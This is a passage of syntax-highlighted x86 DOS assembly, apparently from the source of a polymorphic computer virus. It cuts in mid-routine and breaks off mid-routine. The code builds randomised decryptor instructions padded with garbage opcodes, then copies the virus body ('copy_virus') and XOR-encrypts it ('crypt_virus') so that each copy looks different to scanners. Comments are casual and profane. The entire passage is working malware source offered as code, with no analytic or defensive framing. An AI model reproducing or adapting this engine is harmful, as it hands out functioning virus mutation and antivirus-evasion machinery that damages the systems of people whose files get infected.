                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FB81h</span><span class="sc0">      </span><span class="sc1">; Generate CMP BX, imm16</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; Save DI</span><span class="sc0">
                </span><span class="sc6">scasw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">status_byte</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">     
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc0">         </span><span class="sc1">; Generate JNZ</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; Save DI on stack</span><span class="sc0">
                </span><span class="sc6">scasb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">status_byte</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">     
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C383h</span><span class="sc0">      </span><span class="sc1">; Generate ADD BX,imm16</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">; AL -&gt; 4</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; Restore SI from stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; DX = SI</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">; Increase DX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; AX = DI</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; AX = AX-DX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; Store AL to ES:[SI]</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l00py</span><span class="sc0">
</span><span class="sc5">lets_rock</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FB81h</span><span class="sc0">      </span><span class="sc1">; Generate CMP BX,imm16</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; Save DI on stack</span><span class="sc0">
                </span><span class="sc6">scasw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">status_byte</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">     
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc0">         </span><span class="sc1">; Generate JZ</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; Save DI on stack</span><span class="sc0">
                </span><span class="sc6">scasb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">        </span><span class="sc1">; Generate JMP</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">jmp_temp</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; All this stuff is</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">; because the goddamn JMP</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; AX = AX-DX</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; Restore SI from stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; DX = SI</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">; Increase DX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; AX = DI</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; AX = AX-DX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; Store AL in ES:[DI]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">         </span><span class="sc1">; Generate POP DS</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pre_garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc0">         </span><span class="sc1">; Generate POPAD</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Store it to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; AX = DI</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">work_space</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; AX = AX-Work Space (initial DI)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">temp</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; Temp = already generated code size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">temp</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Why this if you already have it? :)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">enc_length</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Add the size to encrypt</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; Restore SI from stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store AX into ES:[SI]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Put temporally DS in DX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">reloc_offset</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">reloc_segment</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">                   </span><span class="sc1">; Get DS:[SI] into AX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">copy_virus</span><span class="sc0">      </span><span class="sc1">; if CX = 0 goto copy_virus</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; Decrease AX</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; Multiply AX per 2</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Add it to SI</span><span class="sc0">
                </span><span class="sc6">std</span><span class="sc0">                     </span><span class="sc1">; Set Direction Flag</span><span class="sc0">
</span><span class="sc5">make_temp</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">                   </span><span class="sc1">; Get DS:[SI] into AX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; DS -&gt; BP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; DX -&gt; DS</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">temp</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; BP -&gt; DS</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">              </span><span class="sc1">; Restore BP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; AX -&gt; ES:[BP]</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">make_temp</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">     
</span><span class="sc5">copy_virus</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; DS = DX</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">          </span><span class="sc1">; Get a random number</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">              </span><span class="sc1">; Restore BP from stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; ES:[BP] &lt;- AL</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">              </span><span class="sc1">; Restore BP again</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">temp</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Push memory address</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; And pop there</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">enc_length</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Size to copy</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code_offset</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; From where copy (offset)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code_segment</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; From what segment</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; Save DI</span><span class="sc0">
                </span><span class="sc6">repe</span><span class="sc0">    </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">; Copy DS:[SI] to ES:[DI]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; Restore DI</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; DS = DX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">temp</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Setup encryption routine</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">enc_length</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">reloc_offset</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">reloc_segment</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">crypt_virus</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; All this and the below thingies</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; are the fucken encryption loop...</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; Save SI on stack</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; Encryption operation</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; Increment index</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">                   </span><span class="sc1">; Get DS:[SI] into AX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; AX = CX</span><span class="sc0">
                </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">close_engine</span><span class="sc0">    </span><span class="sc1">; If CX = 0 goto close_engine</span><span class="sc0">
</span><span class="sc5">pseudo_loop</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">                   </span><span class="sc1">; Get DS:[SI] into AX</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Normalize</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">              </span><span class="sc1">; Save DS</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; DS = DX</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">work_space</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; AX = AX+work space</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">              </span><span class="sc1">; Restore DS</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Compare DI with AX</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">fix_it</span><span class="sc0">          </span><span class="sc1">; Aren't they equal?</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">; If they are equal, DI=DI+4</span><span class="sc0">
</span><span class="sc5">fix_it</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">pseudo_loop</span><span class="sc0">
</span><span class="sc5">close_engine</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; Restore SI</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; Restore CX</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; Restore AX</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">crypt_virus</span><span class="sc0">     </span><span class="sc1">; Cryption loop</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; DS = DX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">temp</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; CX = Decryptor size</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">              </span><span class="sc1">; Restore ES</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">              </span><span class="sc1">; Restore DS</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; Restore DI</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; Restore SI</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">              </span><span class="sc1">; Restore BP</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">; Restore DX</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">; Restore BX</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; Restore AX</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">                    </span><span class="sc1">; Return to caller</span><span class="sc0">
</span><span class="sc5">engine_start</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">pre_garbage</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; Save SI on stack</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">          </span><span class="sc1">; Get a random number</span><span class="sc0">
                </span><span class="sc6">aam</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
                </span><span class="sc6">cbw</span><span class="sc0">     
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">loop_pre_gbg</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">          </span><span class="sc1">; Get a random number</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; make it to be [0..1]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; multiply per 2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; put it in SI</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">        </span><span class="sc1">; clear msb of SI</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">pseudo_table</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get an offset</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; call it</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">loop_pre_gbg</span><span class="sc0">    </span><span class="sc1">; shitz...</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">    
</span><span class="sc5">pre_garbage</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">get_pseudo_rib</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; ...</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">          </span><span class="sc1">; Get a random number</span><span class="sc0">
                </span><span class="sc6">aam</span><span class="sc0">     </span><span class="sc2">9</span><span class="sc0">               </span><span class="sc1">; Adjust After Multiplication to 9 =)</span><span class="sc0">
